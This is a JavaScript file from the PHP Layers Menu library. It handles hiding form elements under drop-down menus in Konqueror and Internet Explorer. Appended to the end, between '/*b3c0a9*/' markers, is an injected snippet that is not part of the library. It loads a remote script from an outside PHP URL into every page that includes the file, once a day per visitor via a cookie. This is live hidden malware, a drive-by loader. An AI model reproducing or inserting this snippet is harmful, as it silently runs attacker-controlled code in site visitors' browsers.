// PHP Layers Menu 3.2.0-rc (C) 2001-2004 Marco Pratesi - http://www.marcopratesi.it/

function scanChildren(element)
{
	var counter = element.childNodes.length;
        for (var i=0; i<counter; i  ) {
                foobar = element.childNodes.item(i);
		if (	( (Konqueror22 || Konqueror30 || Konqueror31) &&
			 (  foobar.nodeName == 'INPUT' || foobar.nodeName == 'input'
			 || foobar.nodeName == 'SELECT' || foobar.nodeName == 'select'
			 || foobar.nodeName == 'TEXTAREA' || foobar.nodeName == 'textarea'
			 )
			)
			||
// Konqueror 3.2 and 3.3 need hiding only for the following two form elements, but, alas,
// at the time of this writing (Konqueror 3.2.3 and 3.3.0-rc2), hiding of such two form elements
// on Konqueror 3.2 and 3.3 does not work, it is affected by the following bug: http://bugs.kde.org/72885
			( (Konqueror32 || Konqueror33) &&
			 (  ((foobar.nodeName == 'SELECT' || foobar.nodeName == 'select') && foobar.size > 1)
			 || foobar.nodeName == 'TEXTAREA' || foobar.nodeName == 'textarea'
			 )
			)
			||
			( IE &&
			 ( foobar.nodeName == 'SELECT' || foobar.nodeName == 'select' )
			)
		) {
			toBeHidden[toBeHidden.length] = foobar;
		}
                if (foobar.childNodes.length > 0) {
                        scanChildren(foobar);
                }
        }
}

function seeThroughCoordinatesDetection()
{
	if (!((Konqueror && !Konqueror22) || IE5)) {
		return;
	}
	for (i=0; i<toBeHidden.length; i  ) {
		object = toBeHidden[i];
		toBeHiddenLeft[i] = object.offsetLeft;
		while (object.tagName != 'BODY' && object.offsetParent) {
			object = object.offsetParent;
			toBeHiddenLeft[i]  = object.offsetLeft;
		}
		object = toBeHidden[i];
		toBeHiddenTop[i] = object.offsetTop;
		while (object.tagName != 'BODY' && object.offsetParent) {
			object = object.offsetParent;
			toBeHiddenTop[i]  = object.offsetTop;
		}
	}
}

//document.write("<br />\nSCANNING STARTED<br />\n");
//scanChildren(document.getElementsByTagName('BODY').item(0));
if ((Konqueror || IE5) && document.getElementById('phplmseethrough')) {
	scanChildren(document.getElementById('phplmseethrough'));
}
//document.write("<br />\nSCANNING COMPLETED<br />\n");

seeThroughCoordinatesDetection();



/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
